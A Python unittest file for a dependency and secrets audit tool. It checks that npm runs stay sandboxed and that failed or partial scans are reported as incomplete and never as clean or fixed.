            # npm never opened the host .npmrc files; every write stayed in its scratch folder
            with open(trace) as f:
                ops = [line.rstrip("\n").split("\t", 1) for line in f if "\t" in line]
            touched = {p for _, p in ops}
            for p in host_rc.values():
                self.assertNotIn(p, touched)
            writes = [p for op, p in ops if op.startswith("write:")]
            self.assertTrue(writes)
            scratch_roots = {p.split("occupai-audit-")[0] + "occupai-audit-" + p.split("occupai-audit-")[1].split("/")[0]
                             for p in writes if "occupai-audit-" in p}
            for p in writes:
                self.assertIn("occupai-audit-", p, f"npm wrote outside scratch: {p}")
            for s in scratch_roots:
                self.assertFalse(os.path.exists(s), "scratch not cleaned up")
            self.assertFalse(os.path.exists(os.path.join(home, ".npm")))
            self.assertFalse(os.path.exists(os.path.join(tmp, "host-cache")))
            self.assertEqual([n for n in os.listdir(tmp) if n.startswith("LIFECYCLE-RAN")], [])
            self.assertEqual(snapshot(root), before)
        finally:
            for s in (good, sentinel):
                if s:
                    s.shutdown()
                    s.server_close()
            shutil.rmtree(tmp, ignore_errors=True)


# ====================================================================== 4. explicit uncertainty

class TestResultContract(unittest.TestCase):
    def setUp(self):
        self.tmp = realtmp("occupai-p0contract-")
        self.root = os.path.join(self.tmp, "projects")
        fixture_setup.build(self.root, seed=17)
        self.storage = os.path.join(self.tmp, "storage")
        os.makedirs(self.storage)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def seed_audit(self, mode="vuln"):
        """A saved state that knows about one critical finding in bad-deps."""
        st = os.path.join(self.storage, "state.json")
        e = Env(self.tmp, npm_mode=mode)
        au = os.path.join(self.storage, "seed-au.json")
        e.json("audit", "--root", self.root, "--only", "bad-deps", "--state", st, "--out", au)
        e.json("save-state", "--root", self.root, "--state", st, "--audit", au)
        with open(st) as f:
            keys = json.load(f)["audit_keys"]
        self.assertTrue(any(k.startswith("bad-deps/package-lock.json|occupai-demo-anim|") for k in keys))
        return st, keys

    def test_npm_failures_never_clean_or_fixed(self):
        st, keys = self.seed_audit()
        for mode, expected in (("json-error", "npm-error:E401"), ("malformed", "malformed-output"),
                               ("empty-fail", "malformed-output"), ("missing", "npm-not-found")):
            e = Env(self.tmp, npm_mode=mode)
            au = os.path.join(self.storage, f"au-{mode}.json")
            out = e.json("audit", "--root", self.root, "--only", "bad-deps", "--state", st, "--out", au)
            self.assertEqual(out["status"], "incomplete", mode)
            self.assertEqual(out["incomplete"], {"bad-deps": "error"}, mode)
            self.assertEqual(out["fixed_since_last"], [], mode)
            self.assertEqual(sorted(out["carried_unverified"]), sorted(keys), mode)
            self.assertEqual(out["summary"]["bad-deps"]["errors"],
                             [{"file": "bad-deps/package-lock.json", "error": expected}], mode)
            # saving a failed audit keeps the old finding
            e.json("save-state", "--root", self.root, "--state", st, "--audit", au)
            with open(st) as f:
                self.assertEqual(json.load(f)["audit_keys"], keys, mode)

    def test_real_fix_is_reported_as_fixed(self):
        st, keys = self.seed_audit()
        out = Env(self.tmp, npm_mode="clean").json("audit", "--root", self.root, "--only", "bad-deps", "--state", st)
        self.assertEqual(out["status"], "complete")
        self.assertEqual(out["fixed_since_last"], keys)

    def test_corrupt_lockfile(self):
        with open(os.path.join(self.root, "bad-deps", "package-lock.json"), "w") as f:
            f.write('{"lockfileVersion": 3, "packages": {')
        e = Env(self.tmp, npm_mode="clean")
        out = e.json("audit", "--root", self.root, "--only", "bad-deps")
        self.assertEqual(out["results"]["bad-deps"]["npm"]["bad-deps/package-lock.json"],
                         {"status": "error", "error": "corrupt-lockfile"})
        self.assertEqual(e.npm_calls(), [])  # npm never saw it
        checks = os.path.join(self.storage, "checks.json")
        with open(checks, "w") as f:
            json.dump({"checks": [{"id": "demo-x", "title": "x", "scope": "project",
                                   "match": {"malicious_packages": ["occupai-demo-anim"]}}]}, f)
        m = e.json("match", "--root", self.root, "--checks", checks)["demo-x"]
        self.assertEqual(m["projects"]["bad-deps"]["status"], "unknown")
        self.assertIn("bad-deps", m["unknown"])
        self.assertFalse(m["complete"])
        self.assertEqual(m["projects"]["ui-kit"]["status"], "not-affected")

    def test_one_failure_does_not_block_others(self):
        e = Env(self.tmp, npm_mode="fail-for:bad-deps")
        out = e.json("audit", "--root", self.root, "--only", "bad-deps,web-shop,ui-kit")
        self.assertEqual(out["results"]["web-shop"]["status"], "ok")
        self.assertEqual(out["results"]["ui-kit"]["status"], "ok")
        self.assertEqual(out["results"]["bad-deps"]["status"], "error")
        self.assertEqual(out["incomplete"], {"bad-deps": "error"})
        self.assertEqual(out["status"], "incomplete")

    def test_failed_hygiene_keeps_findings_and_rechecks(self):
        e = Env(self.tmp)
        st = os.path.join(self.storage, "state.json")
        hy = os.path.join(self.storage, "hy.json")
        e.json("hygiene", "--root", self.root, "--state", st, "--out", hy)
        e.json("save-state", "--root", self.root, "--state", st, "--hygiene", hy)
        ai = os.path.join(self.root, "web-shop", "src", "lib", "ai.ts")
        os.chmod(ai, 0)
        try:
            if os.access(ai, os.R_OK):
                self.skipTest("running as root: can't make a file unreadable")
            e.json("hygiene", "--root", self.root, "--state", st, "--all", "--out", hy)
            with open(hy) as f:
                out = json.load(f)
            # both checks that read .ts files say so; the others are unaffected
            self.assertEqual(out["incomplete"]["web-shop"], {"secrets": "incomplete", "ai": "incomplete"})
            carried = out["results"]["web-shop"]["secrets"]["carried_findings"]
            self.assertTrue(any(f["file"] == "src/lib/ai.ts" for f in carried))
            e.json("save-state", "--root", self.root, "--state", st, "--hygiene", hy)
            with open(st) as f:
                saved = json.load(f)["projects"]["web-shop"]
            self.assertTrue(saved["recheck"])
            self.assertTrue(any(f["file"] == "src/lib/ai.ts" for f in saved["hygiene"]["secrets"]["findings"]))
            again = e.json("hygiene", "--root", self.root, "--state", st)
            self.assertIn("web-shop", again["checked"])  # never reused while incomplete
        finally:
            os.chmod(ai, 0o644)

    def test_partial_scan_cannot_close_tracker_rows(self):
        rows = []
        trk.add(rows, "x-1", "Item", "2026-11-16")
        self.assertIsNone(trk.auto_close(rows, "x-1", "not-affected", "2026-11-17", "no match", complete=False))
        self.assertEqual(rows[0]["Status"], "open")
        with self.assertRaises(TypeError):
            trk.auto_close(rows, "x-1", "not-affected", "2026-11-17", "no match")  # must say whether complete


if __name__ == "__main__":
    unittest.main()
